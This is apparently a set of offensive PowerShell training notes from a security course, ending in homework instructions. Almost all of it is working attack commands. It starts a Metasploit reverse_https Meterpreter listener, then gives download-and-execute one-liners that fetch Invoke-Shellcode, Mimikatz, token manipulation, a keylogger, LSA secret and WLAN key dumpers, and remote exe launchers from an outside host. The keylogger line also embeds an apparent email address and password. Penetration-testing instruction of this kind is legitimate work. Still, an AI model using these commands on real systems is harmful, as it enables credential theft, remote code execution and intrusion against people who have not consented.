sudo ./msfconsole
use exploit/multi/handler
set ExitOnSession false
set payload windows/meterpreter/reverse_https
set LHOST 192.168.11.129
set LPORT 4443
set EXITFUNC thread
exploit -j



powershell -command "IEX (New-Object Net.WebClient).DownloadString('https://s3.amazonaws.com/infosecaddictsfiles/Invoke-Shellcode.ps1'); Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost 192.168.11.129 -Lport 4443 -Force"





********************************** Payload which could execute shellcode from DNS TXT queries. **********************************
powershell.exe (new-object System.Net.WebClient).DownloadFile('http://192.168.11.129/nishang/Execution/Execute-DNSTXT-Code.ps1','%TEMP%\Execute-DNSTXT-Code.ps1')
powershell.exe -ExecutionPolicy Bypass -command %TEMP%\Execute-DNSTXT-Code.ps1 32.alteredsecurity.com 64.alteredsecurity.com ns8.zoneedit.com






powershell -command "IEX (New-Object Net.WebClient).DownloadString('http://192.168.11.129/powersploit/Exfiltration/Invoke-Mimikatz.ps1') ; Invoke-Mimikatz" 









********************************** Run mimikatz via powershell  (must be run as SYSTEM) **********************************
powershell -command "IEX (New-Object Net.WebClient).DownloadString('https://s3.amazonaws.com/infosecaddicts-Files/Powersploit/Invoke-Mimikatz.ps1') | Out-File -Encoding ASCII Invoke-Mimikatz.ps1; Import-Module .\Invoke-Mimikatz.ps1 ; Invoke-Mimikatz"





********************************** Token Manipulation to escalate (must be run as an Administrator) **********************************
powershell -command "IEX (New-Object Net.WebClient).DownloadString('http://192.168.11.129/powersploit/Exfiltration/Invoke-TokenManipulation.ps1') ; Invoke-TokenManipulation" 

powershell -command "IEX (New-Object Net.WebClient).DownloadString('https://s3.amazonaws.com/infosecaddicts-Files/Powersploit/Invoke-TokenManipulation.ps1') | Out-File -Encoding ASCII Invoke-TokenManipulation.ps1; Import-Module .\Invoke-TokenManipulation.ps1 ; Invoke-TokenManipulation"








********************************** Nihsang payload which Scan IP-Addresses, Ports and HostNames **********************************
powershell.exe (new-object System.Net.WebClient).DownloadFile('http://192.168.11.129/nishang/Invoke-PingSweep.ps1','%TEMP%\Invoke-PingSweep.ps1')
powershell.exe -ExecutionPolicy Bypass -command %TEMP%\Invoke-PingSweep.ps1 -StartAddress 192.168.11.50 -EndAddress 192.168.11.100 -ResolveHost -ScanPort






********************************** Nihsang payload which Scan IP-Addresses, Ports and HostNames **********************************
powershell.exe (new-object System.Net.WebClient).DownloadFile('http://192.168.11.129/nishang/Port-Scan.ps1','%TEMP%\Port-Scan.ps1')
powershell.exe -ExecutionPolicy Bypass -command %TEMP%\Port-Scan.ps1 -StartAddress 192.168.11.50 -EndAddress 192.168.11.100 -ResolveHost -ScanPort





********************************** Nishang Payload which gathers juicy information from the target. **********************************
powershell.exe (new-object System.Net.WebClient).DownloadFile('http://192.168.11.129/nishang/Get-Information.ps1','%TEMP%\Get-Information.ps1')
powershell.exe -ExecutionPolicy Bypass -command %TEMP%\Get-Information.ps1





********************************** Nishang Payload which gathers juicy information from the target. **********************************
powershell.exe (new-object System.Net.WebClient).DownloadFile('http://192.168.11.129/nishang/Information_Gather.ps1','%TEMP%\Information_Gather.ps1')
powershell.exe -ExecutionPolicy Bypass -command %TEMP%\Information_Gather.ps1





********************************** Nishang script which can drop and execute executables on multiple computers. **********************************
powershell.exe (new-object System.Net.WebClient).DownloadFile('http://192.168.11.129/nishang/Run-EXEonRemote.ps1','%TEMP%\Run-EXEonRemote.ps1')
powershell.exe -ExecutionPolicy Bypass -command Invoke-Command -FilePath %TEMP%\Run-EXEonRemote.ps1 -ComputerName Test-PC





********************************** Nishang Payload which logs keys. **********************************
powershell.exe (new-object System.Net.WebClient).DownloadFile('http://192.168.11.129/nishang/Keylogger.ps1','%TEMP%\Keylogger.ps1')
powershell.exe -ExecutionPolicy Bypass -command %TEMP%\Keylogger.ps1 16e7a8a83f04eec8ab6bc1bce9d103e3 juraghh@gmail.com ITp!Ka3099 1 http://example.com stopthis





********************************** Nishang Payload which silently browses to a URL and accepts Java Applet Run Warning **********************************
powershell.exe (new-object System.Net.WebClient).DownloadFile('http://192.168.11.129/nishang/Browse_Accept_Applet.ps1','%TEMP%\Browse_Accept_Applet.ps1')
powershell.exe -ExecutionPolicy Bypass -command %TEMP%\Browse_Accept_Applet.ps1 http://192.168.11.129:8080/JavaExploit
 



********************************** Nishang Payload which dumps keys for WLAN profiles. **********************************
powershell.exe (new-object System.Net.WebClient).DownloadFile('http://192.168.11.129/nishang/Get-WLAN-Keys.ps1','%TEMP%\Get-WLAN-Keys.ps1')
powershell.exe -ExecutionPolicy Bypass -command %TEMP%\Get-WLAN-Keys.ps1





********************************** Nishang payload which extracts LSA Secrets from local computer. **********************************
powershell.exe (new-object System.Net.WebClient).DownloadFile('http://192.168.11.129/nishang/Get-LSASecret.ps1','%TEMP%\Get-LSASecret.ps1')
powershell.exe -ExecutionPolicy Bypass -command %TEMP%\Get-LSASecret.ps1 -filename .\servers.txt



###################################
# PowerShell Day 1 and 2 Homework #
###################################

Take screenshots of you performing all of the tasks above.

Send Ivana an email ivana{a-t}strategicsec{d-o-t}.com with a word document that contains screenshots of everything that we have covered so far by January 7th, 2018. The subject of the email "First Name - Last Name - PowerShell Homework" (ex: Joseph - McCray - PowerShell Homework).
 
Also be sure to name the attached file "FirstName_LastName_PowerShell_Homework.docx" (Joseph_McCray_PowerShell_Homework.docx).
 
NOTE: This is what is required in order to receive your certificate of completion and CPEs.